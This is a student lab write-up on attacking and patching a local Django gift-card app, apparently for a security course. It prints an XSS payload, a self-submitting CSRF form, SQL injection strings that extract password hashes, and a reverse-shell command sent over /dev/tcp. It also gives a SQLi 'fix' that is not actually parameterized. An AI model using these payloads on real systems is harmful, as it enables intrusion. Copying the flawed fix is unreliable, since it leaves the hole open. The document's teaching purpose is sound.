# Setting up the environment

Running specified commands in Part 0: we set up the environment as specified.

<img width="1792" alt="Screen Shot 2022-03-13 at 3 51 46 PM" src="https://user-images.githubusercontent.com/72175659/158712594-8fbe96e0-f2e1-4e64-8e1d-ec3e89a79424.png">
<img width="1792" alt="Screen Shot 2022-03-13 at 3 52 36 PM" src="https://user-images.githubusercontent.com/72175659/158712601-5273c1e7-5ccc-4028-ae1b-0563183bda38.png">

# Cross-Site Scripting (XSS)

 Through dynamic analysis of the website (injecting javascript into urls and input fields) we find a vulnerability when we are logged in in the gift mode on http://127.0.0.1/gift/0 . We inject "<script>alert(document.cookie)</script>" into the username field of http://127.0.0.1/gift/0 and 0 in the amount field. 
 
  <img width="921" alt="Screen Shot 2022-03-15 at 2 55 14 PM" src="https://user-images.githubusercontent.com/72175659/158712973-e4b01c9f-08ab-4439-9817-3cb9b3b38c61.png">
  
  <img width="1447" alt="Screen Shot 2022-03-15 at 2 52 29 PM" src="https://user-images.githubusercontent.com/72175659/158712989-a2a55264-9437-4808-b35f-69e7d16287e7.png">
  
  As we can see no data is printed in our alert box meaning the cookie data wasn't printed due to the httponly flag that is set to true. With other input such as alert('hello') we do get "hello in the alert box. Httponly prevents scripts from accessing the cookie.
  
For task 1b we made a script that uses the request libraries. The script works by creating a user session and loging us in. We store the session cookie data and use that for another post request on the site, this time on our vulnerable path, http://127.0.0.1/gift/0. If we find our script text injected the website text then we output "XSS vulnerable" otherwise "Not Vulnerable"
  
  <img width="1440" alt="Screen Shot 2022-03-16 at 8 18 18 PM" src="https://user-images.githubusercontent.com/72175659/158713248-df8a020d-d3d9-4d56-8585-a4e1b07eb68b.png">

 This vulnerability is possible because in views.py we have the following line 
 ```
 target_user = request.POST.get('username', None)
 ```
 
 It takes in any input from the vulnerable  field without sanitizing it. To fix this we import escape from Django libraries and escape the target user. This converts the vulnerable input to a safe string by converting all the script elements to HTML elements effectively rendering the exploit we found completely useless. Our script written earlier also verifies no vulnerability is present 
 
 ```
 from django.utils.html import escape
 target_user = escape(request.POST.get('username', None))
 ```
 
 <img width="1116" alt="Screen Shot 2022-03-17 at 5 22 04 PM" src="https://user-images.githubusercontent.com/72175659/158900203-cec6b656-3cb8-491b-83a6-96c4d65b6c97.png">
 <img width="1103" alt="Screen Shot 2022-03-17 at 5 23 45 PM" src="https://user-images.githubusercontent.com/72175659/158900214-57fc8329-112c-4bd6-a997-0215d954dd64.png">
 
# CROSS SITE REQUEST FORGERY
 
 First we verify that we can sen giftcard from user on the left to the user on the right
<img width="1115" alt="Screen Shot 2022-03-17 at 9 01 28 PM" src="https://user-images.githubusercontent.com/72175659/158918268-d5338c41-e077-4068-9b00-cebe891a54c8.png">
 
 Successfully give attacker a giftcard
 
<img width="1115" alt="Screen Shot 2022-03-17 at 9 02 14 PM" src="https://user-images.githubusercontent.com/72175659/158918270-119af53d-4eb6-49f8-83d4-c868f6ba5aef.png">
static and dynamic analysis of the application were used to discover a potential vulnerability. There is blatant disregard for csrf in gifts.hmtl in the form input and settings.py MIDDLEWARE pre sets.

# POC
 we successfully demonstrate a POC attack that works by exploiting the HTML POST method to submit a form with hidden values. We simply dropped the CRSF-POC.html file in the target browser. CSRF-POC.html
 ```
 <html>
	<head>
		<title>POC attack</title>
	</head>
	<body>
		<h1>Pwn press F</h1>
		<form action="http://127.0.0.1:80/gift/0" method="post" target="hiddenframe" name="badform">
		
		        <input type="hidden" name="amount" value="666" /> 
			<input type="hidden" name="username" value="bryan" /> 
			
		 <script>document.badform.submit();</script>
		</form>
	</body>
</html>

 ```
 
 <img width="1102" alt="Screen Shot 2022-03-18 at 3 44 40 PM" src="https://user-images.githubusercontent.com/72175659/159073383-5d4694e6-de9a-451e-8617-d6c755331e56.png">
 
 <img width="1095" alt="Screen Shot 2022-03-20 at 3 25 29 PM" src="https://user-images.githubusercontent.com/72175659/159183641-eb7f6cce-84d3-4799-bd98-65bf0398a26b.png">

We store the POC exploit in an isolated directory rename it index.html and spin up a python server on port 8081 with

```
python3 -m http.server 8081
```
 We go on the targets web browser and go to 0.0.0.0:8081/index.html which will trigger our exploit. The instance of the exploit should gift the attacker a card worth 1111
 
 <img width="883" alt="Screen Shot 2022-03-20 at 3 35 51 PM" src="https://user-images.githubusercontent.com/72175659/159183774-5f578c5d-88b8-44b8-9120-34d6200b14e4.png">

As expected our exploit was successful.

This exploit works because there is not csrf token inside the form  field. What this token does is essentially give a random hidden input that only that instance of the website will have and recognize on submission. This prevents cross websites forgeries to a large extent as guessing that input would require  time, luck, or both. We made jbrg-csrf.py to check for "csrfmiddlewaretoken" in the gift.html templete . The server prints gift.html and since it doesn't have the mitigating control we output "CSRF Vulnerable".
<img width="1082" alt="Screen Shot 2022-03-18 at 4 21 54 PM" src="https://user-images.githubusercontent.com/72175659/159077999-e0a9b1c7-f30b-4add-a161-5a5d55fbaa5e.png">


When we add {%csrf_ token%} to the input brackets in gift.html we get a hidden field not visible when the website is loaded
```
<input type="hidden" name="csrfmiddlewaretoken" value="PScYCWFX0KaFJP5x4nrhvGytLZYmrmSL7Y3wfRHtSblqIuQww6ohzndKo2bsywaS"> 
```
scanning with jbg469-csrf.py shows us vulnerability is mitigated.

<img width="975" alt="Screen Shot 2022-03-24 at 1 52 19 PM" src="https://user-images.githubusercontent.com/72175659/159979524-a3247353-3d66-490b-a4aa-c48c7a9be1a4.png">


<img width="1099" alt="Screen Shot 2022-03-18 at 4 14 19 PM" src="https://user-images.githubusercontent.com/72175659/159077129-5f9803da-103b-4cb0-aef0-a327747b42cd.png">

That enough did not stop our POC exploit from running again, it was that good. We had to edit the views.py file to include @csrf_protect decorator above the gift views function.

<img width="973" alt="Screen Shot 2022-03-20 at 3 32 05 PM" src="https://user-images.githubusercontent.com/72175659/159183866-d7f8b56c-409d-423e-992f-b7b10180dede.png">

<img width="961" alt="Screen Shot 2022-03-20 at 3 31 45 PM" src="https://user-images.githubusercontent.com/72175659/159183872-b03cee4d-9e8f-423d-b6b3-82e45eab535d.png">

The decorator method prevents us from having to add a csrf token to every template on the app as opposed to the middleware method.

We just proved that the technique employed by the script is not ideal as the html file can have a csrf token but its not being actually enforced in the django settings.

# SQLi

<img width="1091" alt="Screen Shot 2022-03-18 at 6 02 10 PM" src="https://user-images.githubusercontent.com/72175659/159090863-9415bc56-cbfd-45c3-9f74-6d7e2998464b.png">

We download a gift card after purchasing and see all the different fields. We are given that one of the fields is parsed unsafely at use so we can use Burpe Suite and this tip from the given port swigger article.

```
Submitting the single quote character ' and looking for errors or other anomalies.
```

We use the proxy function on burpsuite to examine the post command and response to it once we feed our gift card file.

<img width="883" alt="Screen Shot 2022-03-20 at 7 49 04 PM" src="https://user-images.githubusercontent.com/72175659/159191792-918eb14d-4366-4ced-b00c-edf25a58b7d9.png">
We keep changing fields to single quote " ' " to oberve for any anomalities. 
<img width="885" alt="Screen Shot 2022-03-20 at 7 50 52 PM" src="https://user-images.githubusercontent.com/72175659/159191821-a2ae0a1f-a866-4ac6-a425-cc64d4c64df7.png">
<img width="884" alt="Screen Shot 2022-03-20 at 7 51 31 PM" src="https://user-images.githubusercontent.com/72175659/159191835-5db6779e-f57f-4f03-842e-a1b03c35a291.png">

<img width="889" alt="Screen Shot 2022-03-20 at 7 53 21 PM" src="https://user-images.githubusercontent.com/72175659/159191837-961d8ee1-1a6c-43cd-8104-032185b99579.png">

We get key errors when we change the records and signature fields but the most interesting error comes when you cange the "insert cryptographic signature here" field to single quotes . We get an operational error that is unlike other messages we received. We should now try to examine the database contents.
<img width="897" alt="Screen Shot 2022-03-20 at 7 54 07 PM" src="https://user-images.githubusercontent.com/72175659/159191907-95ff4e46-ae0e-4010-aafb-7c405300376e.png">

Examining the RAW post html we can see some interesting SQL statements not seen on other error messages meaning the website was not using " ' " as a character but as an SQL operator, not good. 
```
 <li onclick="toggle('pre140642164615040', 'post140642164615040')"><pre>        # KG: data seems dangerous.</pre></li>
                
                  <li onclick="toggle('pre140642164615040', 'post140642164615040')"><pre>        signature = json.loads(card_data)[&#x27;records&#x27;][0][&#x27;signature&#x27;]</pre></li>
                
                  <li onclick="toggle('pre140642164615040', 'post140642164615040')"><pre>        # signatures should be pretty unique, right?</pre></li>
                
                  <li onclick="toggle('pre140642164615040', 'post140642164615040')"><pre>        card_query = Card.objects.raw(&#x27;select id from LegacySite_card where data = \&#x27;%s\&#x27;&#x27; % signature)</pre></li>
                
                  <li onclick="toggle('pre140642164615040', 'post140642164615040')"><pre>        user_cards = Card.objects.raw(&#x27;select id, count(*) as count from LegacySite_card where LegacySite_card.user_id = %s&#x27; % str(request.user.id))</pre></li>
```

Examining db.sqlite on an online viewer we see some tables of interest 

<img width="1041" alt="Screen Shot 2022-03-20 at 9 56 44 PM" src="https://user-images.githubusercontent.com/72175659/159196606-5c9c1640-1ef9-4605-993e-cc916bb97260.png">

We are being asked for the password data of the user in the session and the administrator, they are found in Legacysite_user.

<img width="1043" alt="Screen Shot 2022-03-20 at 9 57 13 PM" src="https://user-images.githubusercontent.com/72175659/159196953-b193f52c-470b-47e6-8063-37d408f41a56.png">

password data for administrator is 000000000000000000000000000078d2$18821d89de11ab18488fdc0a01f1ddf4d290e198b0f80cd4974fc031dc2615a3
password data for johnbg is 000000000000000000000000000078d2$fd9536f6310de320d67bed983a102591d708ba497eebd1084c4f4cf91b0345a8

a statement that could work is a UNION SELECT since our data needs to be appended after the queries already programmed
we try 
```
'UNION SELECT password FROM Legacysite_user WHERE username='johnbg' --
```
<img width="1131" alt="Screen Shot 2022-03-20 at 10 51 02 PM" src="https://user-images.githubusercontent.com/72175659/159199263-39ddb2fe-8c9c-4d49-beb6-2b44935ee4d9.png">
<img width="1133" alt="Screen Shot 2022-03-20 at 10 51 14 PM" src="https://user-images.githubusercontent.com/72175659/159199265-c25beb03-8d25-4aed-a3d3-df05fef1e137.png">

We find the password data in the output 

we try 
```
'UNION SELECT password FROM Legacysite_user WHERE username='administrator' --
```
<img width="1143" alt="Screen Shot 2022-03-20 at 10 55 20 PM" src="https://user-images.githubusercontent.com/72175659/159199507-31505b32-2043-48c9-b439-e432dde546e0.png">

the following payload is in our jbg469-sqli.gftcrd file

```
{"merchant_id": "NYU Apparel Card", "customer_id": "johnbg", "total_value": "10", "records": [{"record_type": "amount_change", "amount_added": 2000, "signature": "'UNION SELECT password FROM Legacysite_user WHERE username='administrator' --"}]}
```
For building our script to detect the vulnerability we follow a similar approach to the previous scanning algorithms
we login, configure the cookie data, send a post payload, scan server output for a substring indicating SQLi. This time we need to upload a file, set a field to true, and fill in a card name.

The script successfully detects the vulnerability. 


<img width="1145" alt="Screen Shot 2022-03-21 at 1 46 08 AM" src="https://user-images.githubusercontent.com/72175659/159211241-36cb6532-6027-4e94-b4e1-324389019c5f.png">

To fix the vulnerability we examine the vulnerable card_query variable in views.py:
```
#card_query = Card.objects.raw('select id from LegacySite_card where data = \'%s\'' % signature)

```
This makes it so that the signature field is dynamically apended to the hard coded query instead of parametized

we employ the following fix 

```
card_query = Card.objects.raw("SELECT id FROM LegacySite_card WHERE data = '{signature}'")
```
running the sqli detector again shows the vulnerabilty has been mitigated

<img width="1136" alt="Screen Shot 2022-03-21 at 2 10 40 AM" src="https://user-images.githubusercontent.com/72175659/159389697-285ec326-5785-4955-9955-0ca6b6ef3e2f.png">

# Command injection 

We are given a faulty JSON structure is not parsed well and can result in a command injection vulnerability. We buy a new gift card and jumble the input.

<img width="1143" alt="Screen Shot 2022-03-21 at 11 07 32 PM" src="https://user-images.githubusercontent.com/72175659/159404081-e699b055-475e-40e7-baaf-9797af433b71.png">

on the useCard.html site we see there is an alterante field for naming your card. We will try to feed ```;ls -l;``` command here.

<img width="1136" alt="Screen Shot 2022-03-22 at 12 03 23 AM" src="https://user-images.githubusercontent.com/72175659/159405706-17c4f9f5-7a4d-4102-83d8-cd54f2d9e56c.png">

We succeed in injecting a command.

As a proof of concept exploit we use our malicious giftcard file and run the following command in the card name field ```;bash -c "/bin/bash -i > /dev/tcp/10.0.2.15/9090 0<&1 2>&1" ;```
This works becuase -c will execute any command in between the quotes. The command in quotes is based on Lab1  to invoke a reverse shell. 

<img width="1140" alt="Screen Shot 2022-03-22 at 1 53 21 AM" src="https://user-images.githubusercontent.com/72175659/159598757-92d16922-8f54-4a11-b33b-f35ede9d772a.png">

For our python script that detects the vulnerability we need to send an echo instead of a shell so we can use the command ```; bash -c "bash -c " echo -n pwned > /dev/tcp/0.0.0.0/8888 0<&1 2>&1" ;```. This sends "pwned" to our listener which then detects the vulnerability through an if statement. 

<img width="996" alt="Screen Shot 2022-03-24 at 1 12 38 AM" src="https://user-images.githubusercontent.com/72175659/159846843-b7b8cdff-b747-41b1-896e-962cb6a63bbc.png">

We build on earlier attacks and use the socket method provided in the labs to achieve detection.

<img width="988" alt="Screen Shot 2022-03-24 at 1 15 35 AM" src="https://user-images.githubusercontent.com/72175659/159847118-2943a8b6-a710-4963-ad61-a822df67a34c.png">

line 189 in views.py can be blamed for the vulnerability as it only validates empty input as faulty but fails to mitigate against malicious user input. We can not trust the user to control the kind of parsing done with card_fname as it is sometimes parsed along with system commands. An easy fix is to check the input to see if its alphanumeric with isalnum(). Since a name should only be alphanumeric and not contain malicious characters. 
Once we validate non valid out put as 
```
if card_fname is None or card_fname == '' or card_fname.isalnum()==False:
```
cmdi.py no longer detects the vulnerability. 

<img width="998" alt="Screen Shot 2022-03-24 at 1 28 15 AM" src="https://user-images.githubusercontent.com/72175659/159848601-0b817972-fedf-4b9f-9bbb-c5971751476e.png">

# Encrypting the database

To encrypt the database we first create an encryption key with the following script and store it.

<img width="909" alt="Screen Shot 2022-03-26 at 10 24 22 PM" src="https://user-images.githubusercontent.com/72175659/160263950-a187cb54-6775-439d-88db-3129d04c8f22.png">

we generate ```6i-zh2nupPuGm2f5IMgQZzAmChsZZ3ZnaCCE7R3Plk0=```

<img width="891" alt="Screen Shot 2022-03-27 at 11 55 16 AM" src="https://user-images.githubusercontent.com/72175659/160289968-730f8ead-2901-4cbc-8cac-b824b6038770.png">

<img width="906" alt="Screen Shot 2022-03-27 at 11 53 27 AM" src="https://user-images.githubusercontent.com/72175659/160289973-23a36211-16bb-448a-afce-e3b2fcc422f8.png">

<img width="824" alt="Screen Shot 2022-03-27 at 1 52 41 PM" src="https://user-images.githubusercontent.com/72175659/160294090-ce243e02-ea12-427f-ac0f-5bbb5ca16010.png">

we add some fields and modify some fields to settings.py and models.py per the django-encrypted-model-fields documentation.

We buy a new gift card and we can see the  fields in the database are encrypted. When we comment out modifications on settings and models to repurchase a new gift card the fields are in plain text again. We encrypt data and fp as with that info unencrypted an attacker who successfully obtains the database information can use any unused card they find with an SQLi. To further mitigate this threat we can encrypt the used field to make it harder for an attacker to guess which giftcards are new or not and store the secret key in the settings file in an .env which makes it inaccessible to attackers. 


<img width="905" alt="Screen Shot 2022-03-27 at 11 09 32 AM" src="https://user-images.githubusercontent.com/72175659/160290168-c0c241d0-b141-4bfb-8273-7ab8d7ed868e.png">

Again the encrypted purchase was done first then we turned off encryption an did a new purchase. 


# Key Rotation 

we follow the instructions to generate a new key running ```python3 manage.py generate_encryption_key``` in the same directory as our manage.py

<img width="907" alt="Screen Shot 2022-03-27 at 11 56 24 AM" src="https://user-images.githubusercontent.com/72175659/160289997-582c84dd-8fd5-43cf-bb79-120831183b86.png">

this generates Z7eLis2VWVta_h3Uu1UF9NZF9RDV3jrJqzV2_KlItd8= which we will use for our rotation. 
